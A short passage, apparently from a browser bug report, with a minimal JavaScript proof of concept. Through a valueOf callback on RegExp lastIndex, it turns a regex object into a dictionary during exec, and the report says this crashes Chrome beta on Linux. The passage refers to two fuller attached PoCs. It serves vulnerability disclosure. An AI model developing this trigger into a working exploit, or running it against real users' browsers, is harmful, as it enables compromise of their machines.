 
A minimal PoC is as follows, and two full PoCs (one for test and one for exec) are attached.
 
var re;
function f(){
    for(var i = 0; i < 100; i++){
        re["test" + i] = 0x77777777; // make a dict
    }
return 0;
}
 
re = /-/g;
var str = &#039;2016-01-02&#039;;
re.lastIndex = {valueOf : f};
result = re.exec(str);
 
This PoC crashes on google-chrome-beta on Linux.
